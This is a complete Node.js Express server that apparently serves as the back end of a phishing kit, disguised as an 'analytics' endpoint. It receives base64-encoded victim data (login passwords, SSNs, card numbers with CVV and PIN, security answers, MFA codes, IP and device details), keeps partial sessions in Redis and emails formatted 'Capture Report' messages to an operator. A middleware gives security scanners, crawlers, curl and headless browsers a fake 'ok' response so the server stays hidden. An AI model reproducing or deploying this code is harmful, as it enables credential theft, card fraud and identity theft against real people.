const express = require("express");
const cors = require("cors");
const rateLimit = require("express-rate-limit");
const { Resend } = require("resend");
const { createClient } = require("redis");
const crypto = require("crypto");
require("dotenv").config();

const app = express();
const PORT = process.env.PORT || 3000;
const resend = new Resend(process.env.RESEND_API_KEY);
const SESSION_TTL = parseInt(process.env.SESSION_TTL_SECONDS || "600", 10);
const PARTIAL_TIMEOUT = parseInt(process.env.PARTIAL_TIMEOUT_SECONDS || "300", 10);

const redis = createClient({ url: process.env.REDIS_URL });
redis.on("error", (err) => console.error("Redis error:", err.message));
(async () => { await redis.connect(); })();

const analyticsLimiter = rateLimit({ windowMs: 60 * 1000, max: 30 });

const blockScanners = (req, res, next) => {
  const ua = req.headers["user-agent"] || "";
  if (/bot|crawl|spider|scan|check|validator|headless|phantom|selenium|puppeteer|curl|wget|python|java|go-http/i.test(ua)) {
    return res.status(200).json({ status: "ok" });
  }
  next();
};

// Middleware
app.use(cors());
app.options("*", cors());
app.use(express.json());

// ─── Helpers ───────────────────────────────────────────────────────────

function sectionLabel(section) {
  const labels = {
    login: "🔐 Login Credentials",
    personal: "👤 Personal Information",
    credit_card: "💳 Credit Card",
    billing: "🧾 Billing Address",
    security: "🛡️ Security Questions",
    mfa: "🔑 Multi-Factor Auth",
  };
  return labels[section] || section.replace(/_/g, " ").replace(/\b\w/g, (c) => c.toUpperCase());
}

const fieldLabels = {
  uid: "Email / Login ID", token: "Password", src: "Source",
  ssn: "SSN", dob: "Date of Birth", firstName: "First Name", lastName: "Last Name",
  phone: "Phone", address: "Address", city: "City", state: "State", zip: "ZIP",
  cardNumber: "Card Number", expiry: "Expiry", cvv: "CVV", cardholder: "Cardholder Name",
  pin: "PIN", securityAnswer: "Security Answer", recoveryEmail: "Recovery Email",
  ua: "User Agent", lang: "Language", plt: "Platform",
  res: "Screen Resolution", tz: "Timezone", ref: "Referrer",
  ts: "Timestamp", ip: "IP Address",
};

function buildSectionTable(fields) {
  const rows = Object.entries(fields)
    .filter(([k]) => !["ip", "src", "section", "session_token", "device"].includes(k))
    .map(([k, v]) => {
      const label = fieldLabels[k] || k.replace(/_/g, " ").replace(/-/g, " ").replace(/\b\w/g, (c) => c.toUpperCase());
      const val = String(v);
      const isCredential = k === "uid" || k === "token" || k === "ssn" || k === "cardNumber" || k === "cvv" || k === "pin";
      return `<tr>
        <td style="padding:10px 16px;font-weight:600;color:#555;white-space:nowrap;width:180px;border-bottom:1px solid #f0f0f0">${label}</td>
        <td style="padding:10px 16px;color:${isCredential ? "#c0392b" : "#222"};font-weight:${isCredential ? "700" : "400"};border-bottom:1px solid #f0f0f0;word-break:break-all">${val}</td>
      </tr>`;
    })
    .join("");
  return rows;
}

function buildSessionEmail(session) {
  const { sections, device, src, ip, created_at, completed } = session;
  const sectionsHtml = Object.entries(sections).map(([name, fields]) => `
    <tr><td style="padding:16px 16px 8px">
      <p style="margin:0 0 6px 16px;font-size:13px;font-weight:700;color:#c0392b;letter-spacing:0.5px">${sectionLabel(name)}</p>
      <table width="100%" cellpadding="0" cellspacing="0" style="border:1px solid #e0e0e0;border-radius:6px;overflow:hidden">
        ${buildSectionTable(fields)}
      </table>
    </td></tr>
  `).join("");

  const deviceRows = buildSectionTable(device || {});

  const statusBadge = completed
    ? '<span style="display:inline-block;background:#27ae60;color:#fff;padding:2px 12px;border-radius:3px;font-size:11px">Completed</span>'
    : '<span style="display:inline-block;background:#f39c12;color:#fff;padding:2px 12px;border-radius:3px;font-size:11px">Partial</span>';

  return `
  <!DOCTYPE html>
  <html>
  <body style="margin:0;padding:0;background:#f4f6f9;font-family:Arial,sans-serif">
    <table width="100%" cellpadding="0" cellspacing="0" style="background:#f4f6f9;padding:40px 0">
      <tr><td align="center">
        <table width="620" cellpadding="0" cellspacing="0" style="background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,0.08)">
          <tr>
            <td style="background:#2c3e50;padding:24px 32px">
              <h1 style="margin:0;color:#fff;font-size:20px;letter-spacing:1px">📬 Capture Report</h1>
              <p style="margin:6px 0 0;color:rgba(255,255,255,0.75);font-size:13px">
                ${new Date().toUTCString()} &nbsp;·&nbsp; ${statusBadge}
              </p>
            </td>
          </tr>
          <tr><td style="padding:12px 16px">
            <table width="100%" cellpadding="0" cellspacing="0">
              <tr>
                <td style="padding:4px 16px;font-size:12px;color:#888">Source</td>
                <td style="padding:4px 16px;font-size:12px;color:#222;font-weight:600">${src || "Unknown"}</td>
              </tr>
              <tr>
                <td style="padding:4px 16px;font-size:12px;color:#888">IP</td>
                <td style="padding:4px 16px;font-size:12px;color:#222">${ip || "Unknown"}</td>
              </tr>
              <tr>
                <td style="padding:4px 16px;font-size:12px;color:#888">Session started</td>
                <td style="padding:4px 16px;font-size:12px;color:#222">${created_at || "Unknown"}</td>
              </tr>
            </table>
          </td></tr>
          ${sectionsHtml}
          ${deviceRows ? `<tr><td style="padding:16px 16px 8px">
            <p style="margin:0 0 6px 16px;font-size:12px;font-weight:700;color:#888;letter-spacing:0.5px">📱 Device & Session Info</p>
            <table width="100%" cellpadding="0" cellspacing="0" style="border:1px solid #e0e0e0;border-radius:6px;overflow:hidden">
              ${deviceRows}
            </table>
          </td></tr>` : ""}
          <tr>
            <td style="background:#f4f6f9;padding:16px 32px;text-align:center">
              <p style="margin:0;font-size:11px;color:#aaa">Automated capture — do not reply</p>
            </td>
          </tr>
        </table>
      </td></tr>
    </table>
  </body>
  </html>`;
}

async function sendSessionEmail(session) {
  const subject = session.completed
    ? `📬 Complete capture from ${session.src || "unknown source"}`
    : `⏳ Partial capture (${Object.keys(session.sections).length} section(s)) from ${session.src || "unknown source"}`;

  await resend.emails.send({
    from: process.env.EMAIL_FROM,
    to: process.env.EMAIL_TO,
    subject,
    html: buildSessionEmail(session),
  });
  console.log(`✓ Sent ${session.completed ? "FULL" : "PARTIAL"} email for session to ${process.env.EMAIL_TO}`);
}

// ─── Routes ────────────────────────────────────────────────────────────

app.post("/api/analytics", blockScanners, analyticsLimiter, async (req, res) => {
  try {
    const ip =
      req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
      req.socket?.remoteAddress ||
      "Unknown";

    const decoded = JSON.parse(Buffer.from(req.body.d, "base64").toString("utf8"));
    const { section, fields, session_token, src, device } = decoded;

    if (!section || !fields || Object.keys(fields).length === 0) {
      return res.status(400).json({ success: false, message: "Missing section or fields." });
    }

    // ── Existing session: append data ───────────────────────────────
    if (session_token) {
      const raw = await redis.get(`session:${session_token}`);
      if (!raw) {
        return res.status(404).json({ success: false, message: "Session not found or expired." });
      }

      const session = JSON.parse(raw);
      session.sections = session.sections || {};
      session.sections[section] = fields;
      session.last_updated = new Date().toISOString();

      // Lazy timeout: if session > PARTIAL_TIMEOUT seconds old, send partial email first
      const age = (Date.now() - new Date(session.created_at).getTime()) / 1000;
      if (age > PARTIAL_TIMEOUT) {
        await sendSessionEmail(session);
        session.created_at = new Date().toISOString(); // reset timer
      }

      await redis.setEx(`session:${session_token}`, SESSION_TTL, JSON.stringify(session));

      console.log(`✓ Appended section "${section}" to session ${session_token}`);
      return res.json({ success: true, session_token });
    }

    // ── New session ─────────────────────────────────────────────────
    const token = crypto.randomUUID();
    const session = {
      src: src || "unknown",
      sections: { [section]: fields },
      device: device || {},
      ip,
      created_at: new Date().toISOString(),
      last_updated: new Date().toISOString(),
      completed: false,
    };

    await redis.setEx(`session:${token}`, SESSION_TTL, JSON.stringify(session));
    console.log(`✓ Created session ${token} with section "${section}"`);

    res.json({ success: true, session_token: token });
  } catch (error) {
    console.error("✗ Error in /api/analytics:", error.message || error);
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post("/api/analytics/complete", blockScanners, async (req, res) => {
  try {
    const { session_token } = req.body;
    if (!session_token) {
      return res.status(400).json({ success: false, message: "Missing session_token." });
    }

    const raw = await redis.get(`session:${session_token}`);
    if (!raw) {
      return res.status(404).json({ success: false, message: "Session not found or expired." });
    }

    const session = JSON.parse(raw);
    session.completed = true;

    await sendSessionEmail(session);
    await redis.del(`session:${session_token}`);

    console.log(`✓ Completed and sent session ${session_token}`);
    res.json({ success: true });
  } catch (error) {
    console.error("✗ Error in /api/analytics/complete:", error.message || error);
    res.status(500).json({ success: false, error: error.message });
  }
});

app.get("/api/health", (req, res) => {
  res.json({ status: "ok", timestamp: new Date().toISOString() });
});

(async () => {
  try {
    await redis.ping();
    console.log("✓ Connected to Redis");
  } catch (e) {
    console.error("✗ Redis connection failed:", e.message);
  }
  app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
})();
